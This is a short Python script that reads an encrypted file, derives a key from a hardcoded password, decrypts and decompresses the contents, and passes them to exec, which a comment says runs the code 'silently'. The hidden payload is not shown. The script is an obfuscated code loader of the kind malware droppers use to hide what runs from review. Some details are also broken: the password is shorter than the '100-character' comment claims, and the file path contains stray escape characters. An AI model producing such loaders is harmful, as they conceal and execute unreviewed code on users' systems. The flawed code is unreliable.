import zlib
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet

# --- Step 1: Your 100-character password ---
password = "R9tX3qYp6J8sL1vF0nG5bH2kZ7mD4wC6rV8eS1aQ9uT3xP7oB2yL6iN0fW4jK8cM5hZ2dR9gE1v"
password_b64 = base64.urlsafe_b64encode(password.encode()).decode()[:100]

# --- Step 2: Read the encrypted file ---
with open("\binary\arm.bin", "rb") as f:
    data = f.read()

# --- Step 3: Extract salt and encrypted content ---
salt = data[:16]
encrypted_code = data[16:]

# --- Step 4: Derive Fernet key using PBKDF2HMAC ---
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100_000,
)
key = base64.urlsafe_b64encode(kdf.derive(password_b64.encode()))
fernet = Fernet(key)

# --- Step 5: Decrypt ---
compressed_code = fernet.decrypt(encrypted_code)

# --- Step 6: Decompress ---
original_code = zlib.decompress(compressed_code)

# --- Step 7: Execute the original Python code silently ---
exec(original_code)
